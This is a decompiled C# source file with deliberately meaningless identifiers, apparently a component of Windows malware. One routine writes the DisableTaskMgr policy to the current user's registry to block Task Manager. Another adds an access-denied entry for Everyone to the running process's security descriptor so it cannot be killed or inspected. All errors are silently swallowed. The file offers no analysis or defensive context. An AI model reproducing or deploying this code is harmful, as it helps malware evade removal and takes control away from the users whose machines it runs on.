using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace VsYjhNTIRPBh;

internal class oORfxKBHap
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr DEoZDdyHtTSPEv, int HRmysrWdiisQbG, [Out] byte[] xOtdDgpiWvLE, uint kodcCIWRZhZ, out uint lClguwiUqMqy);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr gXuXBmMVbfp, int aotrQyvEVcRjU, [In] byte[] sOSpyZxrRVzCnu);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void orDOJeimdmg(bool eIjcEQbkOQX)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (eIjcEQbkOQX && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor omlJeppsXOsQ(IntPtr CKFLKfyGINA)
	{
		byte[] xOtdDgpiWvLE = new byte[0];
		GetKernelObjectSecurity(CKFLKfyGINA, 4, xOtdDgpiWvLE, 0u, out var lClguwiUqMqy);
		if ((long)lClguwiUqMqy > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(CKFLKfyGINA, 4, xOtdDgpiWvLE = new byte[lClguwiUqMqy], lClguwiUqMqy, out lClguwiUqMqy))
		{
			return null;
		}
		return new RawSecurityDescriptor(xOtdDgpiWvLE, 0);
	}

	private void vUdPHtBlhMUWlFi(IntPtr FkJYnBlYDpBGm, RawSecurityDescriptor SGxAPYoAsQFt)
	{
		byte[] array = new byte[SGxAPYoAsQFt.BinaryLength];
		SGxAPYoAsQFt.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(FkJYnBlYDpBGm, 4, array);
	}

	public void NJNXggwpAaS()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = omlJeppsXOsQ(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			vUdPHtBlhMUWlFi(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
